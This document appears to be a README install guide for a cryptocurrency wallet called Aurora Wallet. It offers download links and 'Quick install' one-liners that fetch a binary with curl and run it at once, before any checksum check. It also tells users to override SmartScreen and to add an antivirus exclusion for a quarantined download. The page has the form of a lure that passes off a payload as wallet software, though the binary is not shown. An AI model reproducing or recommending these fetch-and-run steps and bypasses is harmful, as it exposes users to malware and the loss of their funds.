![Aurora Wallet install on Windows guide](assets/aurora-wallet-guide-article-banner.png)

# How to install Aurora Wallet on Windows

Run the official installer, clear the SmartScreen prompt and start the first sync on Windows 10 or 11.

## Downloads - 2026.08.1.0

<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |


Installing Aurora Wallet on Windows is a short sequence: download the `.exe`, check its SHA-256 value, run it and let the wallet download the chain.

The Windows build ships as a single executable installer. It places the program in `C:\Program Files\Auroracoin\`, creates a Start menu entry and leaves your wallet data in `%APPDATA%\Auroracoin`, which means a later reinstall replaces the program without touching your keys.

<!-- ARTICLE-BODY-BEGIN -->

## Before you run the installer

Windows 10 or 11 on a 64-bit machine is the supported baseline, with four gigabytes of memory as the floor and eight as the comfortable figure. Set aside ten gigabytes of free disk space for the chain data, and prefer an SSD: the first sync writes a lot of small blocks and a spinning disk turns that into an evening.

Download the `.exe` from the release page of this repository rather than from a search result. The file is named `aurora-wallet-v2026.08.1.0.exe`, and the version in the name tells you which release you are running.

## Install in order

1. Download `aurora-wallet-v2026.08.1.0.exe`.
2. Compare its SHA-256 value with the published one before you run it.
3. Double-click the installer. If a blue SmartScreen panel appears, choose More info and then Run anyway.
4. Accept the User Account Control prompt.
5. Finish the wizard, leaving the default destination folder unless you have a reason to change it.
6. Start Aurora Wallet from the Start menu and allow it through the Windows firewall on private networks.
7. Leave the wallet open until the sync reaches one hundred percent.

Checking the download first is the step that separates a safe install from a hopeful one, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/06-verify-sha256-checksums.md">how to verify SHA-256 checksums</a> gives the exact PowerShell command.

## If the installer will not start

Some antivirus suites quarantine a new cryptocurrency installer on sight, and an aggressive policy can remove the file from the Downloads folder before you double-click it. Check the quarantine list, restore the file and add a temporary exclusion for the download, then verify the checksum again to be sure the restored file is intact.

If Windows reports a missing runtime library, install the current Microsoft Visual C++ redistributable and run the installer again. If the sync stalls after install, the peer and firewall fixes in <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/18-windows-defender-smartscreen.md">the SmartScreen and Defender guide</a> cover the Windows side of the connection.

The build that contains these installers is the <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">current Aurora Wallet release</a>, and it is the only version you should install.

## FAQ

### Do I need to disable my antivirus to install?

No. Restore the file from quarantine and exclude the wallet folder if the scanner keeps touching it. A verified installer does not need your protection switched off.

### Can I install on Windows 7?

The build targets Windows 10 and later. Older versions lack the libraries the application expects, and the network side is easier to secure on a supported release.

<!-- ARTICLE-BODY-END -->

## How to install Aurora Wallet

### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.

```cmd
certutil -hashfile setup.exe SHA256
```

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.

```bash
shasum -a 256 setup.dmg
```

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
2. Extract the archive.
3. Run `aurora-wallet`.

Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.

```bash
sha256sum app.zip
```


## Related guides

- [Verify SHA-256 checksums](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/06-verify-sha256-checksums.md)
- [Windows Defender and SmartScreen](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/18-windows-defender-smartscreen.md)
- [Install on macOS](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/04-install-macos.md)
- [First-run setup](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/02-first-run-setup.md)
